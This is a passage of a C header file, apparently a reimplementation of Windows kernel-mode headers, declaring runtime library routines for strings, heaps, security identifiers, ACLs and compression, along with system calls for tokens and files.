  PUNICODE_PREFIX_TABLE_ENTRY NextPrefixTree;
  PUNICODE_PREFIX_TABLE_ENTRY LastNextEntry;
} UNICODE_PREFIX_TABLE, *PUNICODE_PREFIX_TABLE;

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)
typedef struct _COMPRESSED_DATA_INFO {
  USHORT CompressionFormatAndEngine;
  UCHAR CompressionUnitShift;
  UCHAR ChunkShift;
  UCHAR ClusterShift;
  UCHAR Reserved;
  USHORT NumberOfChunks;
  ULONG CompressedChunkSizes[ANYSIZE_ARRAY];
} COMPRESSED_DATA_INFO, *PCOMPRESSED_DATA_INFO;
#endif

/******************************************************************************
 *                         Runtime Library Functions                          *
 ******************************************************************************/

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTSYSAPI
PVOID
NTAPI
RtlAllocateHeap(
  IN HANDLE HeapHandle,
  IN ULONG Flags OPTIONAL,
  IN SIZE_T Size);

NTSYSAPI
BOOLEAN
NTAPI
RtlFreeHeap(
  IN PVOID HeapHandle,
  IN ULONG Flags OPTIONAL,
  IN PVOID BaseAddress);

NTSYSAPI
VOID
NTAPI
RtlCaptureContext(
  OUT PCONTEXT ContextRecord);

NTSYSAPI
ULONG
NTAPI
RtlRandom(
  IN OUT PULONG Seed);

NTSYSAPI
BOOLEAN
NTAPI
RtlCreateUnicodeString(
  OUT PUNICODE_STRING DestinationString,
  IN PCWSTR SourceString);

NTSYSAPI
NTSTATUS
NTAPI
RtlAppendStringToString(
  IN OUT PSTRING Destination,
  IN const STRING *Source);

NTSYSAPI
NTSTATUS
NTAPI
RtlOemStringToUnicodeString(
  IN OUT PUNICODE_STRING DestinationString,
  IN PCOEM_STRING SourceString,
  IN BOOLEAN AllocateDestinationString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeStringToOemString(
  IN OUT POEM_STRING DestinationString,
  IN PCUNICODE_STRING SourceString,
  IN BOOLEAN AllocateDestinationString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUpcaseUnicodeStringToOemString(
  IN OUT POEM_STRING DestinationString,
  IN PCUNICODE_STRING SourceString,
  IN BOOLEAN AllocateDestinationString);

NTSYSAPI
NTSTATUS
NTAPI
RtlOemStringToCountedUnicodeString(
  IN OUT PUNICODE_STRING DestinationString,
  IN PCOEM_STRING SourceString,
  IN BOOLEAN AllocateDestinationString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeStringToCountedOemString(
  IN OUT POEM_STRING DestinationString,
  IN PCUNICODE_STRING SourceString,
  IN BOOLEAN AllocateDestinationString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUpcaseUnicodeStringToCountedOemString(
  IN OUT POEM_STRING DestinationString,
  IN PCUNICODE_STRING SourceString,
  IN BOOLEAN AllocateDestinationString);

NTSYSAPI
NTSTATUS
NTAPI
RtlDowncaseUnicodeString(
  IN OUT PUNICODE_STRING UniDest,
  IN PCUNICODE_STRING UniSource,
  IN BOOLEAN AllocateDestinationString);

NTSYSAPI
VOID
NTAPI
RtlFreeOemString (
  IN OUT POEM_STRING OemString);

NTSYSAPI
ULONG
NTAPI
RtlxUnicodeStringToOemSize(
  IN PCUNICODE_STRING UnicodeString);

NTSYSAPI
ULONG
NTAPI
RtlxOemStringToUnicodeSize(
  IN PCOEM_STRING OemString);

NTSYSAPI
NTSTATUS
NTAPI
RtlMultiByteToUnicodeN(
  OUT PWCH UnicodeString,
  IN ULONG MaxBytesInUnicodeString,
  OUT PULONG BytesInUnicodeString OPTIONAL,
  IN const CHAR *MultiByteString,
  IN ULONG BytesInMultiByteString);

NTSYSAPI
NTSTATUS
NTAPI
RtlMultiByteToUnicodeSize(
  OUT PULONG BytesInUnicodeString,
  IN const CHAR *MultiByteString,
  IN ULONG BytesInMultiByteString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeToMultiByteSize(
  OUT PULONG BytesInMultiByteString,
  IN PCWCH UnicodeString,
  IN ULONG BytesInUnicodeString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeToMultiByteN(
  OUT PCHAR MultiByteString,
  IN ULONG MaxBytesInMultiByteString,
  OUT PULONG BytesInMultiByteString OPTIONAL,
  IN PCWCH UnicodeString,
  IN ULONG BytesInUnicodeString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUpcaseUnicodeToMultiByteN(
  OUT PCHAR MultiByteString,
  IN ULONG MaxBytesInMultiByteString,
  OUT PULONG BytesInMultiByteString OPTIONAL,
  IN PCWCH UnicodeString,
  IN ULONG BytesInUnicodeString);

NTSYSAPI
NTSTATUS
NTAPI
RtlOemToUnicodeN(
  OUT PWSTR UnicodeString,
  IN ULONG MaxBytesInUnicodeString,
  OUT PULONG BytesInUnicodeString OPTIONAL,
  IN PCCH OemString,
  IN ULONG BytesInOemString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeToOemN(
  OUT PCHAR OemString,
  IN ULONG MaxBytesInOemString,
  OUT PULONG BytesInOemString OPTIONAL,
  IN PCWCH UnicodeString,
  IN ULONG BytesInUnicodeString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUpcaseUnicodeToOemN(
  OUT PCHAR OemString,
  IN ULONG MaxBytesInOemString,
  OUT PULONG BytesInOemString OPTIONAL,
  IN PCWCH UnicodeString,
  IN ULONG BytesInUnicodeString);

#if (NTDDI_VERSION >= NTDDI_VISTASP1)
NTSYSAPI
NTSTATUS
NTAPI
RtlGenerate8dot3Name(
  IN PCUNICODE_STRING Name,
  IN BOOLEAN AllowExtendedCharacters,
  IN OUT PGENERATE_NAME_CONTEXT Context,
  IN OUT PUNICODE_STRING Name8dot3);
#else
NTSYSAPI
VOID
NTAPI
RtlGenerate8dot3Name(
  IN PCUNICODE_STRING Name,
  IN BOOLEAN AllowExtendedCharacters,
  IN OUT PGENERATE_NAME_CONTEXT Context,
  IN OUT PUNICODE_STRING Name8dot3);
#endif

NTSYSAPI
BOOLEAN
NTAPI
RtlIsNameLegalDOS8Dot3(
  IN PCUNICODE_STRING Name,
  IN OUT POEM_STRING OemName OPTIONAL,
  IN OUT PBOOLEAN NameContainsSpaces OPTIONAL);

NTSYSAPI
BOOLEAN
NTAPI
RtlIsValidOemCharacter(
  IN OUT PWCHAR Char);

NTSYSAPI
VOID
NTAPI
PfxInitialize(
  OUT PPREFIX_TABLE PrefixTable);

NTSYSAPI
BOOLEAN
NTAPI
PfxInsertPrefix(
  IN PPREFIX_TABLE PrefixTable,
  IN PSTRING Prefix,
  OUT PPREFIX_TABLE_ENTRY PrefixTableEntry);

NTSYSAPI
VOID
NTAPI
PfxRemovePrefix(
  IN PPREFIX_TABLE PrefixTable,
  IN PPREFIX_TABLE_ENTRY PrefixTableEntry);

NTSYSAPI
PPREFIX_TABLE_ENTRY
NTAPI
PfxFindPrefix(
  IN PPREFIX_TABLE PrefixTable,
  IN PSTRING FullName);

NTSYSAPI
VOID
NTAPI
RtlInitializeUnicodePrefix(
  OUT PUNICODE_PREFIX_TABLE PrefixTable);

NTSYSAPI
BOOLEAN
NTAPI
RtlInsertUnicodePrefix(
  IN PUNICODE_PREFIX_TABLE PrefixTable,
  IN PUNICODE_STRING Prefix,
  OUT PUNICODE_PREFIX_TABLE_ENTRY PrefixTableEntry);

NTSYSAPI
VOID
NTAPI
RtlRemoveUnicodePrefix(
  IN PUNICODE_PREFIX_TABLE PrefixTable,
  IN PUNICODE_PREFIX_TABLE_ENTRY PrefixTableEntry);

NTSYSAPI
PUNICODE_PREFIX_TABLE_ENTRY
NTAPI
RtlFindUnicodePrefix(
  IN PUNICODE_PREFIX_TABLE PrefixTable,
  IN PUNICODE_STRING FullName,
  IN ULONG CaseInsensitiveIndex);

NTSYSAPI
PUNICODE_PREFIX_TABLE_ENTRY
NTAPI
RtlNextUnicodePrefix(
  IN PUNICODE_PREFIX_TABLE PrefixTable,
  IN BOOLEAN Restart);

NTSYSAPI
SIZE_T
NTAPI
RtlCompareMemoryUlong(
  IN PVOID Source,
  IN SIZE_T Length,
  IN ULONG Pattern);

NTSYSAPI
BOOLEAN
NTAPI
RtlTimeToSecondsSince1980(
  IN PLARGE_INTEGER Time,
  OUT PULONG ElapsedSeconds);

NTSYSAPI
VOID
NTAPI
RtlSecondsSince1980ToTime(
  IN ULONG ElapsedSeconds,
  OUT PLARGE_INTEGER Time);

NTSYSAPI
BOOLEAN
NTAPI
RtlTimeToSecondsSince1970(
  IN PLARGE_INTEGER Time,
  OUT PULONG ElapsedSeconds);

NTSYSAPI
VOID
NTAPI
RtlSecondsSince1970ToTime(
  IN ULONG ElapsedSeconds,
  OUT PLARGE_INTEGER Time);

NTSYSAPI
BOOLEAN
NTAPI
RtlValidSid(
  IN PSID Sid);

NTSYSAPI
BOOLEAN
NTAPI
RtlEqualSid(
  IN PSID Sid1,
  IN PSID Sid2);

NTSYSAPI
BOOLEAN
NTAPI
RtlEqualPrefixSid(
  IN PSID Sid1,
  IN PSID Sid2);

NTSYSAPI
ULONG
NTAPI
RtlLengthRequiredSid(
  IN ULONG SubAuthorityCount);

NTSYSAPI
PVOID
NTAPI
RtlFreeSid(
  IN PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAllocateAndInitializeSid(
  IN PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
  IN UCHAR SubAuthorityCount,
  IN ULONG SubAuthority0,
  IN ULONG SubAuthority1,
  IN ULONG SubAuthority2,
  IN ULONG SubAuthority3,
  IN ULONG SubAuthority4,
  IN ULONG SubAuthority5,
  IN ULONG SubAuthority6,
  IN ULONG SubAuthority7,
  OUT PSID *Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlInitializeSid(
  OUT PSID Sid,
  IN PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
  IN UCHAR SubAuthorityCount);

NTSYSAPI
PULONG
NTAPI
RtlSubAuthoritySid(
  IN PSID Sid,
  IN ULONG SubAuthority);

NTSYSAPI
ULONG
NTAPI
RtlLengthSid(
  IN PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlCopySid(
  IN ULONG Length,
  IN PSID Destination,
  IN PSID Source);

NTSYSAPI
NTSTATUS
NTAPI
RtlConvertSidToUnicodeString(
  IN OUT PUNICODE_STRING UnicodeString,
  IN PSID Sid,
  IN BOOLEAN AllocateDestinationString);

NTSYSAPI
VOID
NTAPI
RtlCopyLuid(
  OUT PLUID DestinationLuid,
  IN PLUID SourceLuid);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateAcl(
  OUT PACL Acl,
  IN ULONG AclLength,
  IN ULONG AclRevision);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAce(
  IN OUT PACL Acl,
  IN ULONG AceRevision,
  IN ULONG StartingAceIndex,
  IN PVOID AceList,
  IN ULONG AceListLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlDeleteAce(
  IN OUT PACL Acl,
  IN ULONG AceIndex);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetAce(
  IN PACL Acl,
  IN ULONG AceIndex,
  OUT PVOID *Ace);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessAllowedAce(
  IN OUT PACL Acl,
  IN ULONG AceRevision,
  IN ACCESS_MASK AccessMask,
  IN PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessAllowedAceEx(
  IN OUT PACL Acl,
  IN ULONG AceRevision,
  IN ULONG AceFlags,
  IN ACCESS_MASK AccessMask,
  IN PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateSecurityDescriptorRelative(
  OUT PISECURITY_DESCRIPTOR_RELATIVE SecurityDescriptor,
  IN ULONG Revision);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetDaclSecurityDescriptor(
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  OUT PBOOLEAN DaclPresent,
  OUT PACL *Dacl,
  OUT PBOOLEAN DaclDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetOwnerSecurityDescriptor(
  IN OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PSID Owner OPTIONAL,
  IN BOOLEAN OwnerDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetOwnerSecurityDescriptor(
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  OUT PSID *Owner,
  OUT PBOOLEAN OwnerDefaulted);

NTSYSAPI
ULONG
NTAPI
RtlNtStatusToDosError(
  IN NTSTATUS Status);

NTSYSAPI
NTSTATUS
NTAPI
RtlCustomCPToUnicodeN(
  IN PCPTABLEINFO CustomCP,
  OUT PWCH UnicodeString,
  IN ULONG MaxBytesInUnicodeString,
  OUT PULONG BytesInUnicodeString OPTIONAL,
  IN PCH CustomCPString,
  IN ULONG BytesInCustomCPString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeToCustomCPN(
  IN PCPTABLEINFO CustomCP,
  OUT PCH CustomCPString,
  IN ULONG MaxBytesInCustomCPString,
  OUT PULONG BytesInCustomCPString OPTIONAL,
  IN PWCH UnicodeString,
  IN ULONG BytesInUnicodeString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUpcaseUnicodeToCustomCPN(
  IN PCPTABLEINFO CustomCP,
  OUT PCH CustomCPString,
  IN ULONG MaxBytesInCustomCPString,
  OUT PULONG BytesInCustomCPString OPTIONAL,
  IN PWCH UnicodeString,
  IN ULONG BytesInUnicodeString);

NTSYSAPI
VOID
NTAPI
RtlInitCodePageTable(
  IN PUSHORT TableBase,
  IN OUT PCPTABLEINFO CodePageTable);


#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */


#if (NTDDI_VERSION >= NTDDI_WINXP)

NTSYSAPI
PVOID
NTAPI
RtlCreateHeap(
  IN ULONG Flags,
  IN PVOID HeapBase OPTIONAL,
  IN SIZE_T ReserveSize OPTIONAL,
  IN SIZE_T CommitSize OPTIONAL,
  IN PVOID Lock OPTIONAL,
  IN PRTL_HEAP_PARAMETERS Parameters OPTIONAL);

NTSYSAPI
PVOID
NTAPI
RtlDestroyHeap(
  IN PVOID HeapHandle);

NTSYSAPI
USHORT
NTAPI
RtlCaptureStackBackTrace(
  IN ULONG FramesToSkip,
  IN ULONG FramesToCapture,
  OUT PVOID *BackTrace,
  OUT PULONG BackTraceHash OPTIONAL);

NTSYSAPI
ULONG
NTAPI
RtlRandomEx(
  IN OUT PULONG Seed);

NTSYSAPI
NTSTATUS
NTAPI
RtlInitUnicodeStringEx(
  OUT PUNICODE_STRING DestinationString,
  IN PCWSTR SourceString OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
RtlValidateUnicodeString(
  IN ULONG Flags,
  IN PCUNICODE_STRING String);

NTSYSAPI
NTSTATUS
NTAPI
RtlDuplicateUnicodeString(
  IN ULONG Flags,
  IN PCUNICODE_STRING SourceString,
  OUT PUNICODE_STRING DestinationString);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetCompressionWorkSpaceSize(
  IN USHORT CompressionFormatAndEngine,
  OUT PULONG CompressBufferWorkSpaceSize,
  OUT PULONG CompressFragmentWorkSpaceSize);

NTSYSAPI
NTSTATUS
NTAPI
RtlCompressBuffer(
  IN USHORT CompressionFormatAndEngine,
  IN PUCHAR UncompressedBuffer,
  IN ULONG UncompressedBufferSize,
  OUT PUCHAR CompressedBuffer,
  IN ULONG CompressedBufferSize,
  IN ULONG UncompressedChunkSize,
  OUT PULONG FinalCompressedSize,
  IN PVOID WorkSpace);

NTSYSAPI
NTSTATUS
NTAPI
RtlDecompressBuffer(
  IN USHORT CompressionFormat,
  OUT PUCHAR UncompressedBuffer,
  IN ULONG UncompressedBufferSize,
  IN PUCHAR CompressedBuffer,
  IN ULONG CompressedBufferSize,
  OUT PULONG FinalUncompressedSize);

NTSYSAPI
NTSTATUS
NTAPI
RtlDecompressFragment(
  IN USHORT CompressionFormat,
  OUT PUCHAR UncompressedFragment,
  IN ULONG UncompressedFragmentSize,
  IN PUCHAR CompressedBuffer,
  IN ULONG CompressedBufferSize,
  IN ULONG FragmentOffset,
  OUT PULONG FinalUncompressedSize,
  IN PVOID WorkSpace);

NTSYSAPI
NTSTATUS
NTAPI
RtlDescribeChunk(
  IN USHORT CompressionFormat,
  IN OUT PUCHAR *CompressedBuffer,
  IN PUCHAR EndOfCompressedBufferPlus1,
  OUT PUCHAR *ChunkBuffer,
  OUT PULONG ChunkSize);

NTSYSAPI
NTSTATUS
NTAPI
RtlReserveChunk(
  IN USHORT CompressionFormat,
  IN OUT PUCHAR *CompressedBuffer,
  IN PUCHAR EndOfCompressedBufferPlus1,
  OUT PUCHAR *ChunkBuffer,
  IN ULONG ChunkSize);

NTSYSAPI
NTSTATUS
NTAPI
RtlDecompressChunks(
  OUT PUCHAR UncompressedBuffer,
  IN ULONG UncompressedBufferSize,
  IN PUCHAR CompressedBuffer,
  IN ULONG CompressedBufferSize,
  IN PUCHAR CompressedTail,
  IN ULONG CompressedTailSize,
  IN PCOMPRESSED_DATA_INFO CompressedDataInfo);

NTSYSAPI
NTSTATUS
NTAPI
RtlCompressChunks(
  IN PUCHAR UncompressedBuffer,
  IN ULONG UncompressedBufferSize,
  OUT PUCHAR CompressedBuffer,
  IN ULONG CompressedBufferSize,
  IN OUT PCOMPRESSED_DATA_INFO CompressedDataInfo,
  IN ULONG CompressedDataInfoLength,
  IN PVOID WorkSpace);

NTSYSAPI
PSID_IDENTIFIER_AUTHORITY
NTAPI
RtlIdentifierAuthoritySid(
  IN PSID Sid);

NTSYSAPI
PUCHAR
NTAPI
RtlSubAuthorityCountSid(
  IN PSID Sid);

NTSYSAPI
ULONG
NTAPI
RtlNtStatusToDosErrorNoTeb(
  IN NTSTATUS Status);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateSystemVolumeInformationFolder(
  IN PCUNICODE_STRING VolumeRootPath);

#if defined(_M_AMD64)

FORCEINLINE
VOID
RtlFillMemoryUlong (
  OUT PVOID Destination,
  IN SIZE_T Length,
  IN ULONG Pattern)
{
  PULONG Address = (PULONG)Destination;
  if ((Length /= 4) != 0) {
    if (((ULONG64)Address & 4) != 0) {
      *Address = Pattern;
      if ((Length -= 1) == 0) {
        return;
      }
      Address += 1;
    }
    __stosq((PULONG64)(Address), Pattern | ((ULONG64)Pattern << 32), Length / 2);
    if ((Length & 1) != 0) Address[Length - 1] = Pattern;
  }
  return;
}

#define RtlFillMemoryUlonglong(Destination, Length, Pattern)                \
    __stosq((PULONG64)(Destination), Pattern, (Length) / 8)

#else

NTSYSAPI
VOID
NTAPI
RtlFillMemoryUlong(
  OUT PVOID Destination,
  IN SIZE_T Length,
  IN ULONG Pattern);

NTSYSAPI
VOID
NTAPI
RtlFillMemoryUlonglong(
  OUT PVOID Destination,
  IN SIZE_T Length,
  IN ULONGLONG Pattern);

#endif /* defined(_M_AMD64) */

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_WS03)
NTSYSAPI
NTSTATUS
NTAPI
RtlInitAnsiStringEx(
  OUT PANSI_STRING DestinationString,
  IN PCSZ SourceString OPTIONAL);
#endif

#if (NTDDI_VERSION >= NTDDI_WS03SP1)

NTSYSAPI
NTSTATUS
NTAPI
RtlGetSaclSecurityDescriptor(
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  OUT PBOOLEAN SaclPresent,
  OUT PACL *Sacl,
  OUT PBOOLEAN SaclDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetGroupSecurityDescriptor(
  IN OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PSID Group OPTIONAL,
  IN BOOLEAN GroupDefaulted OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetGroupSecurityDescriptor(
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  OUT PSID *Group,
  OUT PBOOLEAN GroupDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlAbsoluteToSelfRelativeSD(
  IN PSECURITY_DESCRIPTOR AbsoluteSecurityDescriptor,
  OUT PSECURITY_DESCRIPTOR SelfRelativeSecurityDescriptor OPTIONAL,
  IN OUT PULONG BufferLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlSelfRelativeToAbsoluteSD(
  IN PSECURITY_DESCRIPTOR SelfRelativeSecurityDescriptor,
  OUT PSECURITY_DESCRIPTOR AbsoluteSecurityDescriptor OPTIONAL,
  IN OUT PULONG AbsoluteSecurityDescriptorSize,
  OUT PACL Dacl OPTIONAL,
  IN OUT PULONG DaclSize,
  OUT PACL Sacl OPTIONAL,
  IN OUT PULONG SaclSize,
  OUT PSID Owner OPTIONAL,
  IN OUT PULONG OwnerSize,
  OUT PSID PrimaryGroup OPTIONAL,
  IN OUT PULONG PrimaryGroupSize);

#endif /* (NTDDI_VERSION >= NTDDI_WS03SP1) */

#if (NTDDI_VERSION >= NTDDI_VISTA)

NTSYSAPI
NTSTATUS
NTAPI
RtlNormalizeString(
  IN ULONG NormForm,
  IN PCWSTR SourceString,
  IN LONG SourceStringLength,
  OUT PWSTR DestinationString,
  IN OUT PLONG DestinationStringLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlIsNormalizedString(
  IN ULONG NormForm,
  IN PCWSTR SourceString,
  IN LONG SourceStringLength,
  OUT PBOOLEAN Normalized);

NTSYSAPI
NTSTATUS
NTAPI
RtlIdnToAscii(
  IN ULONG Flags,
  IN PCWSTR SourceString,
  IN LONG SourceStringLength,
  OUT PWSTR DestinationString,
  IN OUT PLONG DestinationStringLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlIdnToUnicode(
  IN ULONG Flags,
  IN PCWSTR SourceString,
  IN LONG SourceStringLength,
  OUT PWSTR DestinationString,
  IN OUT PLONG DestinationStringLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlIdnToNameprepUnicode(
  IN ULONG Flags,
  IN PCWSTR SourceString,
  IN LONG SourceStringLength,
  OUT PWSTR DestinationString,
  IN OUT PLONG DestinationStringLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateServiceSid(
  IN PUNICODE_STRING ServiceName,
  OUT PSID ServiceSid,
  IN OUT PULONG ServiceSidLength);

NTSYSAPI
LONG
NTAPI
RtlCompareAltitudes(
  IN PCUNICODE_STRING Altitude1,
  IN PCUNICODE_STRING Altitude2);

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_WIN7)

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeToUTF8N(
  OUT PCHAR UTF8StringDestination,
  IN ULONG UTF8StringMaxByteCount,
  OUT PULONG UTF8StringActualByteCount,
  IN PCWCH UnicodeStringSource,
  IN ULONG UnicodeStringByteCount);

NTSYSAPI
NTSTATUS
NTAPI
RtlUTF8ToUnicodeN(
  OUT PWSTR UnicodeStringDestination,
  IN ULONG UnicodeStringMaxByteCount,
  OUT PULONG UnicodeStringActualByteCount,
  IN PCCH UTF8StringSource,
  IN ULONG UTF8StringByteCount);

NTSYSAPI
NTSTATUS
NTAPI
RtlReplaceSidInSd(
  IN OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PSID OldSid,
  IN PSID NewSid,
  OUT ULONG *NumChanges);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateVirtualAccountSid(
  IN PCUNICODE_STRING Name,
  IN ULONG BaseSubAuthority,
  OUT PSID Sid,
  IN OUT PULONG SidLength);

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */


#if defined(_AMD64_) || defined(_IA64_)


#endif /* defined(_AMD64_) || defined(_IA64_) */



#define RTL_DUPLICATE_UNICODE_STRING_NULL_TERMINATE 1
#define RTL_DUPLICATE_UNICODE_STRING_ALLOCATE_NULL_STRING 2

#define RtlUnicodeStringToOemSize(STRING) (NLS_MB_OEM_CODE_PAGE_TAG ?                                \
                                           RtlxUnicodeStringToOemSize(STRING) :                      \
                                           ((STRING)->Length + sizeof(UNICODE_NULL)) / sizeof(WCHAR) \
)

#define RtlOemStringToUnicodeSize(STRING) (                 \
    NLS_MB_OEM_CODE_PAGE_TAG ?                              \
    RtlxOemStringToUnicodeSize(STRING) :                    \
    ((STRING)->Length + sizeof(ANSI_NULL)) * sizeof(WCHAR)  \
)

#define RtlOemStringToCountedUnicodeSize(STRING) (                    \
    (ULONG)(RtlOemStringToUnicodeSize(STRING) - sizeof(UNICODE_NULL)) \
)

#define RtlOffsetToPointer(B,O) ((PCHAR)(((PCHAR)(B)) + ((ULONG_PTR)(O))))
#define RtlPointerToOffset(B,P) ((ULONG)(((PCHAR)(P)) - ((PCHAR)(B))))

typedef enum _OBJECT_INFORMATION_CLASS {
  ObjectBasicInformation = 0,
  ObjectNameInformation = 1, /* FIXME, not in WDK */
  ObjectTypeInformation = 2,
  ObjectTypesInformation = 3, /* FIXME, not in WDK */
  ObjectHandleFlagInformation = 4, /* FIXME, not in WDK */
  ObjectSessionInformation = 5, /* FIXME, not in WDK */
  MaxObjectInfoClass /* FIXME, not in WDK */
} OBJECT_INFORMATION_CLASS;

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryObject(
  IN HANDLE Handle OPTIONAL,
  IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
  OUT PVOID ObjectInformation OPTIONAL,
  IN ULONG ObjectInformationLength,
  OUT PULONG ReturnLength OPTIONAL);

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTSYSCALLAPI
NTSTATUS
NTAPI
NtOpenThreadToken(
  IN HANDLE ThreadHandle,
  IN ACCESS_MASK DesiredAccess,
  IN BOOLEAN OpenAsSelf,
  OUT PHANDLE TokenHandle);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtOpenProcessToken(
  IN HANDLE ProcessHandle,
  IN ACCESS_MASK DesiredAccess,
  OUT PHANDLE TokenHandle);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryInformationToken(
  IN HANDLE TokenHandle,
  IN TOKEN_INFORMATION_CLASS TokenInformationClass,
  OUT PVOID TokenInformation OPTIONAL,
  IN ULONG TokenInformationLength,
  OUT PULONG ReturnLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtAdjustPrivilegesToken(
  IN HANDLE TokenHandle,
  IN BOOLEAN DisableAllPrivileges,
  IN PTOKEN_PRIVILEGES NewState OPTIONAL,
  IN ULONG BufferLength,
  OUT PTOKEN_PRIVILEGES PreviousState,
  OUT PULONG ReturnLength OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateFile(
  OUT PHANDLE FileHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PLARGE_INTEGER AllocationSize OPTIONAL,
  IN ULONG FileAttributes,
  IN ULONG ShareAccess,
  IN ULONG CreateDisposition,
  IN ULONG CreateOptions,
  IN PVOID EaBuffer,
  IN ULONG EaLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtDeviceIoControlFile(
  IN HANDLE FileHandle,
  IN HANDLE Event OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN ULONG IoControlCode,
  IN PVOID InputBuffer OPTIONAL,
  IN ULONG InputBufferLength,
  OUT PVOID OutputBuffer OPTIONAL,
  IN ULONG OutputBufferLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtFsControlFile(
  IN HANDLE FileHandle,
  IN HANDLE Event OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN ULONG FsControlCode,
  IN PVOID InputBuffer OPTIONAL,
  IN ULONG InputBufferLength,
  OUT PVOID OutputBuffer OPTIONAL,
  IN ULONG OutputBufferLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtLockFile(
  IN HANDLE FileHandle,
  IN HANDLE Event OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PLARGE_INTEGER ByteOffset,
  IN PLARGE_INTEGER Length,
  IN ULONG Key,
  IN BOOLEAN FailImmediately,
  IN BOOLEAN ExclusiveLock);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtOpenFile(
  OUT PHANDLE FileHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN ULONG ShareAccess,
  IN ULONG OpenOptions);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryDirectoryFile(
  IN HANDLE FileHandle,
  IN HANDLE Event OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID FileInformation,
  IN ULONG Length,
  IN FILE_INFORMATION_CLASS FileInformationClass,
  IN BOOLEAN ReturnSingleEntry,
  IN PUNICODE_STRING FileName OPTIONAL,
  IN BOOLEAN RestartScan);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryInformationFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID FileInformation,
  IN ULONG Length,
  IN FILE_INFORMATION_CLASS FileInformationClass);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryQuotaInformationFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID Buffer,
  IN ULONG Length,
